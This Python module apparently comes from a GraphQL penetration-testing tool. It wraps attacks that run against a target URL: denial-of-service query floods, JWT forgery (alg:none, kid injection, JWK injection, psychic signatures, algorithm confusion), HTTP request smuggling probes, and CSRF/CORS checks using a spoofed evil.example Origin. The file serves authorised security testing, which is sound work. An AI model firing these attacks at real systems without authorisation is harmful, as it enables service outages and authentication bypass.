"""Arsenal tools - thin wrappers over the utils/ arsenal (crypto, raw sockets, OOB state, payloads)."""

from __future__ import annotations

import json
from typing import Any

from .senses import detect_dos_surface

_PAGE_ARGS = ("first", "limit", "last", "count", "take", "perpage", "pagesize")


def _pagination_query(schema_map: dict[str, Any]) -> str | None:
    from .schema import _minimal_selection
    qroot = schema_map.get("_query_type", "Query")
    for fname, info in (schema_map.get(qroot) or {}).items():
        if str(fname).startswith("_") or not isinstance(info, dict):
            continue
        parg = next((a["name"] for a in (info.get("args") or [])
                     if str(a.get("name", "")).lower() in _PAGE_ARGS
                     and "Int" in str(a.get("type", ""))), None)
        if not parg:
            continue
        if any(str(a.get("type", "")).rstrip().endswith("!") and a.get("name") != parg
               for a in (info.get("args") or [])):
            continue
        sel = _minimal_selection(schema_map, info.get("return_type", ""))
        return f"query {{ {fname}({parg}: 1000000) {sel} }}".strip()
    return None


def tool_dos(client: Any, schema_map: dict[str, Any], dos_kind: str,
             data_field: str | None = None,
             extra_headers: dict | None = None) -> tuple[str, dict, str | None, str]:
    """Send a DoS payload of the requested kind and check whether it was accepted.

    Returns (query, raw response, vuln_type or None, reason); `data_field` targets
    a concrete field for alias duplication when given.
    """
    k = (dos_kind or "aliases").lower()
    from ..utils.graphql_dos import DoSType, generate_dos_payload
    _gen = {"depth": DoSType.DEPTH_LIMIT, "nesting": DoSType.DEPTH_LIMIT,
            "fragment": DoSType.FRAGMENT_CIRCULAR, "circular": DoSType.FRAGMENT_CIRCULAR,
            "directive": DoSType.DIRECTIVE_OVERLOAD, "directives": DoSType.DIRECTIVE_OVERLOAD,
            "complexity": DoSType.COMPLEXITY_OVERFLOW, "overflow": DoSType.COMPLEXITY_OVERFLOW}
    if k == "batch":
        query = json.dumps([{"query": "{__typename}"} for _ in range(20)])
    elif k in _gen:
        p = generate_dos_payload(_gen[k], schema_map)
        query = p[0] if isinstance(p, tuple) else str(p)
    elif k in ("pagination", "paginate"):
        query = _pagination_query(schema_map) or (
            "query { " + " ".join(f"a{i}: __typename" for i in range(120)) + " }")
    elif data_field:
        from .schema import _minimal_selection
        qroot = schema_map.get("_query_type", "Query")
        info = (schema_map.get(qroot) or {}).get(data_field, {})
        sel = _minimal_selection(schema_map, info.get("return_type", "")) if isinstance(info, dict) else ""
        query = "query { " + " ".join(f"a{i}: {data_field} {sel}".strip() for i in range(60)) + " }"
    else:
        query = "query { " + " ".join(f"a{i}: __typename" for i in range(120)) + " }"
    resp = client.execute(query, extra_headers=extra_headers)
    vt, reason = detect_dos_surface(query, resp)
    return query, resp, vt, reason


def tool_forge_jwt(approach: str, secret: str | None, claims: dict | None,
                   harvested: dict[str, list[str]]) -> str:
    """Forge a JWT for the chosen attack, seeding claims from a harvested token then overlaying `claims`.

    Approaches: none (alg:none), weak_secret (HS256 w/ given secret), kid (path traversal),
    kid_sqli (kid injects the key), jwk (embed attacker key in header), psychic (ECDSA r=s=0),
    confusion/rs256 (HS256 signed with the RSA public key in `secret`, resolved by the caller).
    """
    from ..utils import jwt_attacks
    base: dict[str, Any] = {}
    for tok in harvested.get("jwt", []):
        base = jwt_attacks.decode_payload(tok) or base
        if base:
            break
    if isinstance(claims, dict):
        base = {**base, **claims}
    a = (approach or "none").lower()
    if "confus" in a or "rs256" in a or "alg_conf" in a:
        return jwt_attacks.forge_alg_confusion(secret or "", base)
    if "jwk" in a:
        return jwt_attacks.forge_jwk_injection(base)
    if "psychic" in a or "zero" in a or "r=s" in a:
        return jwt_attacks.forge_psychic(base)
    if "kid" in a and ("sql" in a or "inject" in a or "command" in a):
        return jwt_attacks.forge_kid_injection(base, "command" if "command" in a else "sqli")
    if "weak" in a or "secret" in a:
        return jwt_attacks.forge_hs256(secret or "secret", base)
    if "kid" in a:
        return jwt_attacks.forge_kid_traversal(base)
    return jwt_attacks.forge_none(base)


def tool_smuggle(target_url: str) -> tuple[bool, str]:
    """Probe HTTP request smuggling (CL.TE/TE.CL/TE.TE) against the target.

    Returns (vulnerable, detail); a False with a transport-error detail means the
    probes never ran, which is not a clean negative.
    """
    from ..utils.request_smuggler import GraphQLSmuggler
    s = GraphQLSmuggler(target_url)
    completed = 0
    for name, fn in (("CL.TE", s.test_cl_te), ("TE.CL", s.test_te_cl), ("TE.TE", s.test_te_te)):
        try:
            r = fn()
        except Exception:  # noqa: BLE001
            continue
        completed += 1
        if getattr(r, "vulnerable", False):
            return True, f"{name} desync ({getattr(r, 'confidence', '?')})"
    if completed == 0:
        return False, ("smuggle probes could not execute (socket/TLS/transport error) - request "
                       "smuggling was NOT tested, so this is NOT a clean result")
    return False, "no smuggling/desync detected"


def tool_csrf(target_url: str, cookies: dict | None, n_mutations: int = -1,
              session: Any = None) -> list[str]:
    """Run GET-exec, content-type, and CORS checks and return human-readable verdicts.

    `n_mutations` gates the GET-mutation probe (0 skips it when the schema has none).
    Pass the scan client's session so proxy/TLS settings apply to these probes too.
    """
    import requests
    http = session or requests
    jar = cookies or {}
    out: list[str] = []
    try:
        r = http.get(target_url, params={"query": "{__typename}"}, cookies=jar, timeout=12)
        executed = r.status_code == 200 and ("__typename" in r.text or '"data"' in r.text)
        if not executed:
            out.append(f"GET-exec: rejected (HTTP {r.status_code}) - not GET-CSRFable")
        elif n_mutations == 0:
            out.append("GET-exec: queries run via GET, but the schema has 0 mutations -> classic CSRF N/A")
        else:
            out.append("GET-exec: queries RUN via GET - CSRF-exploitable ONLY if a mutation also works "
                       "via GET; verify by running a real mutation over GET before reporting")
    except Exception as e:  # noqa: BLE001
        out.append(f"GET-exec: check failed ({str(e)[:50]})")
    if n_mutations != 0:
        try:
            r = http.get(target_url, params={"query": "mutation { __typename }"}, cookies=jar, timeout=12)
            try:
                body = r.json()
            except (ValueError, requests.RequestException):
                body = None
            d = body.get("data") if isinstance(body, dict) else None
            confirmed = (r.status_code == 200 and isinstance(body, dict) and not body.get("errors")
                         and isinstance(d, dict) and isinstance(d.get("__typename"), str))
            if confirmed:
                out.append("GET-MUTATION CONFIRMED: a mutation operation EXECUTED over HTTP GET "
                           "(mutation{__typename} returned data, no errors) - state-changing mutations are "
                           "CSRF-exploitable via a crafted link/img/form. This IS a CSRF finding.")
            else:
                out.append(f"GET-mutation: blocked over GET (HTTP {r.status_code}) - mutations not GET-runnable")
        except Exception as e:  # noqa: BLE001
            out.append(f"GET-mutation: check failed ({str(e)[:50]})")
    smuggled = []
    for ct, body in (("text/plain", '{"query":"{__typename}"}'),
                     ("application/x-www-form-urlencoded", "query=%7B__typename%7D")):
        try:
            r = http.post(target_url, data=body, headers={"Content-Type": ct}, cookies=jar, timeout=12)
            if r.status_code == 200 and "__typename" in (r.text or ""):
                smuggled.append(ct)
        except Exception:  # noqa: BLE001
            continue
    if smuggled:
        out.append(f"content-type: GraphQL also executes under {', '.join(smuggled)} (a CORS-preflight-free "
                   "simple request) - bypasses CSRF protection ONLY IF the endpoint relies on a json-only "
                   "guard + cookie auth; verify a guard exists before reporting (advisory, not auto-recorded).")
    try:
        origin = "https://evil.example"
        r = http.post(target_url, json={"query": "{__typename}"},
                      headers={"Origin": origin}, cookies=jar, timeout=12)
        acao = r.headers.get("Access-Control-Allow-Origin", "")
        acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
        if acao == origin and acac == "true":
            out.append(f"CORS: reflects arbitrary Origin WITH credentials ({acao}) - EXPLOITABLE")
        elif acao in (origin, "*"):
            out.append(f"CORS: permissive (ACAO={acao}, creds={acac or 'absent'}) - review, not a clean finding")
        else:
            out.append(f"CORS: locked down (ACAO={acao or 'absent'})")
    except Exception as e:  # noqa: BLE001
        out.append(f"CORS: check failed ({str(e)[:50]})")
    out.append("(cache-poisoning / CSWSH: NOT auto-verified - do NOT report without a working browser PoC)")
    return out
